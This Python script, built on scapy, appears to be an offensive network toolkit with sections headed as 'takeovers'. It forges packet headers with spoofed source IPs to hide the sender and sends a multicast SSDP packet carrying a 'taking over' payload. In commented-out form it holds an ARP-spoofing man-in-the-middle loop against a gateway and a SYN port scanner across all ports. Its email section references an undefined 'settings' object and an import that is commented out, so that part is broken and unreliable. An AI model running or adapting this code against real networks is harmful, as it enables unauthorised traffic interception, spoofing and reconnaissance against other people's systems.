#!/usr/bin/env python3
from scapy.all import *
# from scrapy.mail import MailSender
from decouple import config
import threading,socket,time,requests

######################################
print('### [ IP INPUT ] ###')
# print("Enter IP_SRC <space> IP_DST")
# IP_SRC, IP_DST = input().split(' ')

######################################
print('### [ DATA RUNNER ] ###')
HOST,PORTS= "127.0.0.1",3338
ALL_PORT = range(1,65535)
PAYLOAD=(b"th333boo is taking over")

######################################
print('### [ PUBLIC IP ] ###')
try :
    PUBLIC_IP = requests.get('http://ipinfo.io/json').json()['ip']
    print(PUBLIC_IP)
except:
    pass

######################################
print('### [ NETWORK CARD ] ###')
print(get_if_list())

######################################
print('### [ FOOTPRINT CUSTOM ] ###')
HW_SRC = "FF:FF:FF:FF:FF:FF"
HW_DST = "FF:FF:FF:FF:FF:FF"
IP_SRC = "8.2.246.1"
IP_DST = "8.3.11.1"
IP_GW = "192.168.1.1"
# IP_SRC = config('IP_SRC')
# IP_DST = config('IP_DST')

######################################
print('### [ FOOTPRINT CLEANER ] ###')
print('# [ BEFORE ] #')
FRAME_IP = IP()
FRAME = Ether()

FRAME.show()
FRAME_IP.show()

print('# [ AFTER ] #')
FRAME = Ether(src=HW_SRC, dst=HW_DST)
FRAME_IP = IP(src=IP_SRC, dst=IP_DST, ttl=(111), frag=0, tos=0x0)
FRAME.show()
FRAME_IP.show()

######################################
print('### [ TRACEROUTE ] ###')
# ans,unans=traceroute(PUBLIC_IP,l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname="th333boo.com")))
# res,unans = sr(IP(dst=PUBLIC_IP", ttl=(5,10), flags="MF")/UDP(sport=RandShort( ), dport=53), timeout=125)

######################################
print('### [ TRACEROUTE TAKEOVER ] ###')

######################################
print('### [ ARP TAKEOVER ] ###')
# def get_mac(IP_DST):
#     print('# [ ARP INFO ] #')
#     FRAME_ARP = ARP(op="who-has",psrc=IP_GW,pdst=IP_DST)
#     ARP_BRODCAST = FRAME/FRAME_ARP
#     ARP_RESPONS = srp(ARP_BRODCAST, timeout=1,verbose=False)[0]
#     print(ARP_RESPONS)
#     return ARP_RESPONS[0][1].hwsrc

# def spoof(target_ip, spoof_ip):
#     target_mac = get_mac(target_ip)
#     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
#     scapy.send(packet, verbose=False)

# def restore(dest_ip, source_ip):
#     dest_mac = get_mac(dest_ip)
#     source_mac = get_mac(source_ip)
#     packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
#                        psrc=source_ip, hwsrc=source_mac)
#     scapy.send(packet, count=4, verbose=False)
# sent_packets_count = 0  
# try:
#     while True:
#         spoof(IP_DST, IP_GW)
#         spoof(IP_GW, IP_DST)
#         sent_packets_count += 2
#         print(f"\r[+] Packets sent: {sent_packets_count}", end="")
#         time.sleep(2)
# except KeyboardInterrupt:
#     print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
#     restore(IP_DST, IP_GW)
#     restore(IP_GW, IP_DST)
#     print("\nARP table restored. Quiting")

######################################
print('### [ MULTICAST TAKEOVER ] ###')

ssdpRequest = Ether(src=HW_SRC, dst=HW_DST) / IP(src="192.168.1.143",dst="239.255.255.250") / UDP(sport=1025, dport= 1900) / PAYLOAD
sendp(ssdpRequest)

######################################
print('### [ DNS TAKEOVER ] ###')

######################################
print("### [ PORT SCANNING ] ###")
# def PortScanner():
#     for dst_port in ALL_PORT:
#         src_port = random.randint(1025,65534)
#         resp = sr1(
#             IP(dst=host)/TCP(sport=src_port,dport=dst_port,flags="S"),timeout=1,
#             verbose=0,
#         )

#         if resp is None:
#             print(f"{host}:{dst_port} is filtered (silently dropped).")

#         elif(resp.haslayer(TCP)):
#             if(resp.getlayer(TCP).flags == 0x12):
#                 # Send a gratuitous RST to close the connection
#                 send_rst = sr(
#                     IP(dst=host)/TCP(sport=src_port,dport=dst_port,flags='R'),
#                     timeout=1,
#                     verbose=0,
#                 )
#                 print(f"{host}:{dst_port} is open.")

#             elif (resp.getlayer(TCP).flags == 0x14):
#                 print(f"{host}:{dst_port} is closed.")

#         elif(resp.haslayer(ICMP)):
#             if(
#                 int(resp.getlayer(ICMP).type) == 3 and
#                 int(resp.getlayer(ICMP).code) in [1,2,3,9,10,13]
#             ):
#                 print(f"{host}:{dst_port} is filtered (silently dropped)."

######################################
print('### [ ALL NETWORK TAKEOVER ] ###')

######################################
print('### [ EMAIL SETUP ]###')
smtphost=settings[config('MAIL_HOST')],
mailfrom=settings[config('MAIL_FROM')],
smtpuser=settings[config('MAIL_USER')],
smtppass=settings[config('MAIL_PASS')],
smtpport=settings.getint(config('MAIL_PORT')),
smtptls=settings.getbool(config('MAIL_TLS')),
smtpssl=settings.getbool(config('MAIL_SSL')),
mailer  = MailSender().from_settings(settings)